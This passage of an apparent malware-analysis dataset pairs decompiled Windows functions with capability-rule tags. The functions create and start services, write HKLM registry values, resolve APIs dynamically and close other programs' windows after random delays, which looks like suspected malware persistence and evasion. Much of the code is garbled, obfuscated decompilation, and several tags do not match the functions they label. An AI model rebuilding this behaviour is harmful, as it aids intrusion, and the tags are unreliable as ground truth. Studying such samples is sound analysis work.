= (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar3 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar3 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar3 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00403d6d:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x00403d79:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar3 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar3 < 0) || (var_10h == NULL)) ||\n                       (iVar3 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar3 < 0)) {\njoined_r0x00403d34:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x00403d79;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403b70:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00403770(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411690);\n                        if (iVar4 != 0) goto joined_r0x00403b70;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar3 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar3 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00403d19:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00403d6d;\n                        }\n                        iVar3 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar3 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00403d19;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar7 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + 1;\n                            }\n                            *puVar7 = 0;\n                            *(puVar7 + 2) = 0;\n                            fcn.00403770(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.00403880(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00403d34;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            uVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                uVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar3;\n}\n",
        "token_count": 2625
    },
    "00403e90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403e90(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x411638);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403e10, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 363
    },
    "004045d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004047d4) overlaps instruction at (ram,0x004047d0)\n// \n// WARNING: Removing unreachable block (ram,0x004047ea)\n// WARNING: Removing unreachable block (ram,0x00404626)\n// WARNING: Removing unreachable block (ram,0x0040482f)\n\nvoid __fastcall fcn.004045d0(uint8_t param_1, int32_t *param_2, char *param_3)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    char *in_EAX;\n    int32_t unaff_EBX;\n    uchar *puVar3;\n    char *pcVar4;\n    char **unaff_EDI;\n    char **ppcVar5;\n    char *pcVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    bool bVar9;\n    unkbyte10 in_ST0;\n    int32_t in_stack_5f9dff5f;\n    uint16_t uStack24;\n    uchar auStack4 [4];\n    \n    do {\n        ppcVar5 = unaff_EDI;\n        *param_3 = 'k';\n        uStack24 = ppcVar5;\n        bVar9 = (POPCOUNT(param_1 - 1) & 1U) == 0;\n        in_EAX = CONCAT31(in_EAX >> 8 & 0xffff00 | in_EAX >> 8, 0x30);\n        param_3[1] = '0';\n        unaff_EDI = ppcVar5;\n        if (('\\0' < param_1) && (param_1 < '\\x01')) {\n            out(0xc4, in_EAX);\n            param_2 = param_2 & 0xffffff00 | param_2 ^ param_1;\n            unaff_EDI = ppcVar5 + 1;\n            *ppcVar5 = in_EAX;\n            bVar9 = (POPCOUNT((unaff_EBX >> 8) - *in_EAX) & 1U) == 0;\n            uStack24 = in_SS;\n        }\n        param_3[2] = -0x5c;\n        puVar3 = auStack4;\n        pcVar6 = param_3;\n        if ((!bVar9) && (puVar3 = auStack4,  bVar9)) {\n            pcVar4 = *unaff_EDI;\n            *unaff_EDI = param_3;\n            puVar3 = auStack4 + -in_stack_5f9dff5f;\n            if (puVar3 < 0) {\n                return;\n            }\n            bVar9 = (POPCOUNT(pcVar4 & 0xff) & 1U) == 0;\n            pcVar6 = pcVar4;\n            if (-1 < pcVar4) {\n                *(pcVar4 + 0x23) = &uStack24 + *(pcVar4 + 0x23);\n                goto code_r0x0040466a;\n            }\n        }\n        pcVar6[3] = '0';\n        pcVar4 = pcVar6;\n        if ((bVar9) || (!bVar9)) goto code_r0x0040466a;\n        pcVar4 = *unaff_EDI;\n        *unaff_EDI = pcVar6;\n        puVar3 = puVar3 + -*(puVar3 + 0x5f9dff63);\n    } while (puVar3 < 0);\n    if (pcVar4 < 0) {\ncode_r0x0040466a:\n        pcVar4[4] = 'B';\n        in_EAX = in_EAX & 0xffff;\n        pcVar4[5] = -99;\n        pcVar4[6] = -0x39;\n    }\n    pcVar4[7] = -0x34;\n    uVar1 = in_EAX & 0xffff;\n    uVar2 = uVar1;\n    pcVar4[8] = -0x59;\n    pcVar4[9] = '\\x05';\n    puVar7 = *(puVar3 + 8);\n    *(puVar7 + 10) = 8;\n    *(puVar7 + 0xb) = 0xd7;\n    *(puVar7 + 3) = 0x55;\n    if ((param_2 <= (pcVar4 | 0x561b)) && ((pcVar4 | 0x561b) < param_2)) {\n        pcVar6 = puVar7 | puVar3;\n        puVar7 = pcVar6 + 1;\n        *pcVar6 = uVar1;\n        param_2 = param_2 & 0xffffff00;\n        uVar2 = uVar1 + (uVar1 >> 8) * 'y';\n        uStack24 = in_ES;\n    }\n    *(puVar7 + 0xd) = 0xc6;\n    bVar9 = -1 < (uVar2 + unaff_EBX | 0x11a9);\n    uVar1 = ppcVar5 & 0xffff0000 | uStack24;\n    *(puVar7 + 0xe) = 0xa1;\n    if ((bVar9) && (!bVar9)) {\n        *(uVar1 + 0x8316dbec) = in_ST0;\n        *param_2 = *param_2 + 0x47c6df84;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(puVar7 + 0xf) = 0xb8;\n    *(puVar7 + 4) = 0xec;\n    *(puVar7 + 0x11) = 0x93;\n    puVar8 = puVar7;\n    if (('\\0' < uStack24) && (uStack24 < '\\x01')) {\n        out(0xc4, uVar1);\n        puVar8 = puVar7 + 1;\n        *puVar7 = uVar1;\n    }\n    *(puVar8 + 0x12) = 200;\n    *(puVar8 + 0x13) = 0xdd;\n    if ((!SCARRY4(unaff_EBX, 1)) && (SCARRY4(unaff_EBX, 1))) {\n        LOCK();\n    }\n    **(puVar3 + 0xc) = 0x14;\n    return;\n}\n",
        "token_count": 1451
    },
    "00404870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404870(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004045d0(&var_68h, &var_4h);\n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    fcn.00401cb0(uVar2 - 0x68, *(uVar2 - 4), 0x4116f4, 0x12000);\n    puVar3 = *(uVar2 + 0xc);\n    **(uVar2 + 8) = 0x4116f4;\n    *puVar3 = 0x12000;\n    return;\n}\n",
        "token_count": 299
    },
    "00404da0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404da0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00401160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011d4) overlaps instruction at (ram,0x004011d1)\n// \n\nchar * fcn.00401160(void)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    ushort extraout_CX;\n    int32_t unaff_EBX;\n    int32_t iVar5;\n    code *pcVar6;\n    ushort in_SS;\n    bool bVar7;\n    uint8_t in_AF;\n    uchar uVar8;\n    uint uVar9;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411368);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar3 == 0) {\n        return NULL;\n    }\n    bVar7 = false;\n    uVar8 = true;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x411378);\n    *0x423718 = pcVar4;\n    if ((!uVar8) && (uVar8)) {\n        iVar5 = unaff_EBX + 1;\n        uVar2 = pcVar4;\n        if (bVar7 || iVar5 == 0) {\n            *pcVar4 = *pcVar4 + uVar2;\n            pcVar6[0x5e] = pcVar6[0x5e] + iVar5;\n            return pcVar4;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (pcVar4 & 0xffff0000 | CONCAT11((pcVar4 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar5;\n        iVar3 = iVar3 + 1;\n        uVar8 = iVar3 == 0;\n    }\n    *0x42371c = (*pcVar6)(iVar3, 0x411394);\n    if ((uVar8) || (!uVar8)) {\n        uVar9 = 0x4113a4;\n    }\n    else {\n        pcVar6 = CONCAT22(extraout_CX, in_SS);\n        uVar9 = 0x47;\n    }\n    *0x423720 = (*pcVar6)(iVar3, uVar9);\n    if (((*0x423718 != NULL) && (*0x42371c != 0)) && (*0x423720 != 0)) {\n        return 0x1;\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "00401210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401229) overlaps instruction at (ram,0x00401225)\n// \n\nint32_t __fastcall fcn.00401210(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    code *pcVar1;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    \n    if ((in_CF) || (!in_CF)) {\n        pcVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    else {\n        if (param_1 != 1 && in_ZF != '\\0') {\n            return in_EAX;\n        }\n        *unaff_EDI = unaff_ESI + 4;\n        pcVar1 = sym.imp.MSVCRT.dll_rand + in_CF + *0x9750e2b5;\n    }\n    return pcVar1 % 5 + 3;\n}\n",
        "token_count": 210
    },
    "004016c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016fe) overlaps instruction at (ram,0x004016fd)\n// \n\nbool fcn.004016c0(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    bool in_CF;\n    bool bVar5;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((in_CF) || (!in_CF)) {\n        in_EAX = &var_4h;\n    }\n    uVar2 = fcn.00401000(in_EAX);\n    bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return false;\n    }\n    if (((bVar5) && (!bVar5)) || (var_4h == NULL)) {\n        return false;\n    }\n    uVar2 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41143c, 0x41147c, 1, var_4h, ~uVar2 - 1);\n    return iVar3 == 0;\n}\n",
        "token_count": 356
    },
    "00401ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b33) overlaps instruction at (ram,0x00401b2f)\n// \n\nbool __fastcall fcn.00401ad0(uint param_1, int32_t param_2)\n\n{\n    uint *arg_1ch;\n    int32_t iVar1;\n    uchar *puVar2;\n    bool bVar3;\n    uchar auStack272 [264];\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    bVar3 = (POPCOUNT(auStack272 & 0xff) & 1U) == 0;\n    uStack8 = 0x104;\n    if ((bVar3) || (!bVar3)) {\n        arg_1ch = &uStack8;\n    }\n    else {\n        arg_1ch = param_2 + 1;\n        puVar2 = *0x8d17b43a + 1;\n    }\n    iVar1 = fcn.004041d0(0x80000002, 0x411554, 0x411594, puVar2 + -8, puVar2 + -0x10c, arg_1ch);\n    if (iVar1 != 0) {\n        if ((0 < iVar1) && (iVar1 < 1)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 354
    },
    "00401d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d89) overlaps instruction at (ram,0x00401d88)\n// \n\nuint8_t * __cdecl fcn.00401d30(uint8_t *arg_8h, uint32_t arg_ch, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    bool bVar7;\n    \n    puVar4 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    uVar2 = arg_8h - puVar4;\n    if (arg_8h < puVar4 || uVar2 == 0) {\n        do {\n            bVar7 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n            if ((bVar7) || (!bVar7)) {\n                arg_ch = arg_ch & 0xffffff00 | *arg_10h;\n            }\n            puVar1 = arg_ch + 0x3a168a08;\n            *puVar1 = *puVar1 | 0xffffffca;\n            if (*puVar1 == 0) {\n                iVar3 = arg_14h + -1;\n                arg_ch = 0;\n                bVar7 = true;\n                puVar5 = arg_8h;\n                puVar6 = arg_10h;\n                do {\n                    puVar6 = puVar6 + 1;\n                    puVar5 = puVar5 + 1;\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    bVar7 = *puVar5 == *puVar6;\n                } while (bVar7);\n                if (bVar7) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n            uVar2 = arg_8h - puVar4;\n        } while (arg_8h < puVar4 || uVar2 == 0);\n    }\n    return NULL;\n}\n",
        "token_count": 507
    },
    "00401f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401f80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 108
    },
    "00402000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402021) overlaps instruction at (ram,0x0040201f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402000(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *pcVar1;\n    uint8_t in_CF;\n    bool bVar2;\n    \n    bVar2 = arg_ch + -1 < 0;\n    if (arg_ch == 1) {\n        if ((bVar2) || (!bVar2)) {\n            func_0x00402750();\n        }\n        else {\n            pcVar1 = in_CF + 0x72ae82f;\n            *pcVar1 = *pcVar1 + pcVar1;\n        }\n        fcn.00401750();\n        fcn.00403fa0();\n        if (*0x423724 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402540();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 275
    },
    "00402160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402160(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint uStack96;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    puVar2 = &var_68h;\n    fcn.004021f0(puVar2, &var_4h);\n    if ((!bVar3) && (bVar3)) {\n        *puVar2 = uStack96;\n        return;\n    }\n    fcn.00401cb0(&var_68h, var_4h, 0x407010, 0xa260);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa260;\n    return;\n}\n",
        "token_count": 295
    },
    "004024a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024f3) overlaps instruction at (ram,0x004024f0)\n// \n\nuint fcn.004024a0(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    ushort extraout_CX;\n    unkbyte3 unaff_ESI;\n    uint arg_ch;\n    uint unaff_EDI;\n    ushort in_SS;\n    bool bVar3;\n    uchar uVar4;\n    ushort uVar5;\n    uint arg_14h;\n    \n    arg_ch = param_2;\n    uVar4 = unaff_EDI;\n    uVar5 = unaff_EDI >> 8;\n    arg_14h = CONCAT31(unaff_ESI, unaff_EDI >> 0x18);\n    puVar2 = fcn.00401e50(param_1, param_2, &param_1, &param_2);\n    bVar3 = puVar2 == NULL;\n    if (bVar3) {\n        return 0;\n    }\n    if (!bVar3) {\n        if (bVar3) {\n            arg_ch = CONCAT13(arg_14h, CONCAT21(uVar5, uVar4));\n            bVar3 = *0x10 == 0x9;\n        }\n    }\n    puVar2[0x16] = param_2;\n    if ((bVar3) || (uVar5 = extraout_CX,  !bVar3)) {\n        puVar2 = &param_2;\n        uVar5 = puVar2 >> 0x10;\n    }\n    puVar1 = (puVar2 | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | param_2;\n    fcn.00401e50(CONCAT22(uVar5, in_SS) & 0xffffff00 | in_SS, arg_ch, 0x47, arg_14h);\n    return 1;\n}\n",
        "token_count": 439
    },
    "004035d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035ea) overlaps instruction at (ram,0x004035e8)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004035d0(int32_t param_1, char param_2, int32_t param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    ulong uVar11;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    if (in_OF == in_SF) {\n        uStack16 = CONCAT22(param_1, uStack16);\n        if (in_OF != in_SF) goto code_r0x004035e7;\n    }\n    uStack20 = param_4;\n    iStack24 = param_3;\n    uStack16 = 0xf01ff;\n    in_EAX = param_4;\n    param_1 = param_3;\ncode_r0x004035e7:\n    uVar6 = &stack0xffffffe8 ^ *(unaff_EBX + -0x75);\n    puVar1 = (unaff_ESI | 0x8b) - 1;\n    *puVar1 = *puVar1 | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    pcVar2 = (unaff_ESI | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    pcVar3 = _sym.imp.ADVAPI32.dll_OpenServiceA;\n    puVar7 = uVar6 - 4;\n    *(uVar6 - 4) = 0x4035fd;\n    uVar11 = (*pcVar3)();\n    iVar4 = uVar11;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    *(puVar7 + -4) = iVar4;\n    *(puVar7 + -8) = uVar11 >> 0x20;\n    *(puVar7 + -0xc) = in_EAX;\n    *(puVar7 + -4) = 0;\n    *(puVar7 + -8) = 0;\n    *(puVar7 + -0xc) = iVar4;\n    pcVar3 = _sym.imp.ADVAPI32.dll_StartServiceA;\n    puVar8 = puVar7 + -0x10;\n    *(puVar7 + -0x10) = 0x403626;\n    iVar5 = (*pcVar3)();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar5 == 0) {\n        puVar9 = puVar8 + -4;\n        puVar8 = puVar8 + -4;\n        *puVar9 = 0x403632;\n        iVar5 = (*pcVar3)();\n        if (iVar5 != 0x420) {\n            puVar10 = puVar8 + -4;\n            puVar8 = puVar8 + -4;\n            *puVar10 = 0x40363b;\n            iVar5 = (*pcVar3)();\n            if (iVar5 != 0x422) {\n                *(puVar8 + -4) = iVar4;\n                pcVar3 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                *(puVar8 + -8) = 0x40364b;\n                (*pcVar3)();\n                return 0;\n            }\n        }\n    }\n    *(puVar8 + -4) = iVar4;\n    pcVar3 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    *(puVar8 + -8) = 0x40365d;\n    (*pcVar3)();\n    return 1;\n}\n",
        "token_count": 939
    },
    "00403670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403685) overlaps instruction at (ram,0x00403683)\n// \n\nfloat10 fcn.00403670(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    uint32_t *puVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    char *unaff_EDI;\n    uint8_t in_CF;\n    bool bVar6;\n    bool in_SF;\n    float10 in_ST0;\n    float10 fVar7;\n    \n    if ((in_SF) || (!in_SF)) {\n        bVar6 = false;\n        puVar4 = *0x423730;\n        if (*0x423730 != NULL) {\n            return in_ST0;\n        }\n    }\n    else {\n        puVar4 = in_EAX + 0x3730a12f + in_CF;\n        puVar1 = unaff_EBP + 0xf4175c0;\n        uVar2 = *puVar1;\n        uVar3 = puVar4;\n        *puVar1 = *puVar1 + uVar3;\n        *unaff_EDI = *unaff_EDI - CARRY1(uVar2, uVar3);\n        bVar6 = CARRY1(*puVar4, uVar3);\n        *puVar4 = *puVar4 + uVar3;\n    }\n    if (!bVar6) {\n        uVar5 = (*_sym.imp.MSVCRT.dll_time)(0);\n        fVar7 = (*_sym.imp.MSVCRT.dll_srand)(uVar5);\n        *0x423730 = 0x1;\n        return fVar7;\n    }\n    if (*puVar4 <= *0x10 && puVar4 != 0xffffffff) {\n        return in_ST0 / *(unaff_ESI + 0x6f);\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 470
    },
    "00403750": {
        "rules": [
